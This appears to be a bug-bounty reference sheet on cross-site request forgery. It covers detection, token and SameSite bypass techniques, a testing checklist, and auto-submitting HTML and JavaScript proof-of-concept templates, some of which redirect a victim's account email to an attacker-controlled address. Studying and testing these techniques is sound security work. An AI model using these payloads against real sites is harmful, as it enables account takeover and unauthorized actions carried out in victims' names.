# Cross-Site Request Forgery (CSRF)
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## What It Is
Attacker tricks an authenticated user's browser into making an unintended state-changing request to a site where they're logged in. Requires victim to be authenticated and the site to not validate origin.

## How CSRF Works
1. Victim is logged into `target.com` (browser holds session cookie)
2. Victim visits `attacker.com`
3. `attacker.com` sends request to `target.com` on victim's behalf
4. Browser automatically attaches session cookie
5. `target.com` performs action as victim

---

## Basic Detection

### Step 1: Find State-Changing Requests
Look for POST/PUT/PATCH/DELETE requests that:
- Change password / email
- Transfer money / funds
- Add/remove users / permissions
- Delete data

### Step 2: Check for CSRF Protections
```bash
# Inspect request for CSRF token in body/header
# Check cookies for SameSite attribute
curl -I https://example.com | grep -i "set-cookie"
# Look for: SameSite=Strict/Lax/None
```

### Step 3: Test if Token is Validated
- Remove the token entirely
- Send a blank token
- Send a fake token
- Reuse another user's token

---

## CSRF Token Bypass Techniques

### 1. Delete the Token Parameter
```
# Original: POST /settings/email csrf_token=abc123&new_email=legit@test.com
# Try removing the token entirely:
POST /settings/email
new_email=attacker@evil.com
```

### 2. Send a Blank/Empty Token
```
POST /settings/email
csrf_token=&new_email=attacker@evil.com
```

### 3. Use a Fake Token
```
POST /settings/email
csrf_token=AAAAAAAAAAAAA&new_email=attacker@evil.com
```

### 4. Reuse Another User's Token
If tokens aren't tied to sessions:
- Get your own valid token
- Use it for the victim's session

### 5. Switch POST to GET
```
GET /settings/email?new_email=attacker@evil.com&csrf_token=any HTTP/1.1
```

### 6. Referer Header Manipulation
```html
<!-- No referer via meta tag: -->
<meta name="referrer" content="no-referrer">
<!-- Or: Referrer-Policy: no-referrer in attacker's response header -->

<!-- Subdomain bypass: Host your PoC at http://legit.example.com.evil.com/csrf.html -->
<!-- Or: http://attacker.com/?ref=example.com if using contains() check -->
```

### 7. Content-Type Bypass (JSON CSRF)
If CSRF protection only applies to `application/json`:
```html
<!-- Send as text/plain (no CORS preflight triggered) -->
<form method="POST" enctype="text/plain" action="https://target.com/api/action">
  <input name='{"action":"delete","user":"victim"}' value='}'>
</form>
```

### 8. CORS-Enabled Endpoint
If CORS is misconfigured → send cross-origin AJAX with credentials.

### 9. CSRF via XSS
XSS on same origin bypasses all CSRF protections automatically.

### 10. Subdomain Takeover → CSRF
If subdomain.victim.com is taken over, place CSRF PoC there.

### Token Not Tied to Session
Some sites generate globally valid tokens:
- Log in as user A, capture CSRF token
- Use that token in a CSRF attack against user B

### Token Exposed in URL
```
GET /page?csrf_token=ABC123
# Referer header leaks it to third-party analytics on the page
```

### Double Submit Cookie Without Validation
```
Cookie: csrftoken=XYZ
Body: csrf_token=XYZ
# If server only checks that cookie and body match (not validity), attacker can set both
```

---

## CSRF PoC Templates

### Standard Hidden Form Auto-Submit
```html
<html>
<body>
<form action="https://target.com/settings/email" method="POST">
  <input type="hidden" name="new_email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

### Using iframe to Hide Submit
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='https://target.com/settings/email' 
      target="csrf-frame" id="csrf-form">
  <input type='hidden' name='new_email' value='attacker@evil.com'>
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

### JSON CSRF (via text/plain enctype)
```html
<html>
<body>
  <form action="https://target.com/api/action" method="POST"
        enctype="text/plain">
    <input name='{"action":"delete","user":"victim"}' value="">
  </form>
  <script>document.forms[0].submit()</script>
</body>
</html>
```

### AJAX CSRF (no CORS + Content-Type text/plain)
```javascript
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"action":"delete_account"}'
});
```

### GET-based CSRF
```html
<img src="https://target.com/action?param=value">
<iframe src="https://target.com/logout">
```

---

## SameSite Cookie Bypass

| SameSite Value | Cross-Site POST | Cross-Site GET | Top-Level Nav |
|---|---|---|---|
| Strict | ❌ | ❌ | ❌ |
| Lax | ❌ | ✅ (with `<a>` link) | ✅ |
| None | ✅ | ✅ | ✅ |

### Bypass Lax SameSite
Lax allows GET requests via navigation. If the action can be done via GET:
```html
<a href="https://target.com/action?param=value">Click me!</a>
<!-- Or auto-navigate: -->
<script>window.location = 'https://target.com/action?param=value';</script>
```

### Bypass Strict SameSite
Requires XSS on same origin to chain with CSRF.

---

## Detecting CSRF in Burp Suite
1. Intercept the sensitive POST request in Burp
2. Right-click → "Engagement tools" → "Generate CSRF PoC"
3. Open the PoC in a browser while logged into target
4. Check if the action was performed

---

## Real-World Examples (Yaworski)
- **Shopify** ($500): CSRF to add product to any store's wishlist
- **Badoo** ($852): CSRF chained with account takeover
- **HackerOne**: CSRF on invitation acceptance → add attacker to private programs

## Severity
- **Low**: CSRF on low-impact action (change avatar)
- **Medium**: CSRF on medium-impact (change profile info)
- **High**: CSRF on password/email change, account deletion, fund transfer
- **Critical**: CSRF on admin actions affecting all users

## Testing Checklist
- [ ] Find all state-changing requests
- [ ] Check for CSRF token in request
- [ ] Try removing token
- [ ] Try blank/empty token
- [ ] Try GET method switch
- [ ] Check SameSite cookie attribute
- [ ] Check Referer validation (remove/spoof Referer)
- [ ] Try JSON CSRF via text/plain Content-Type
- [ ] Generate PoC and test in browser
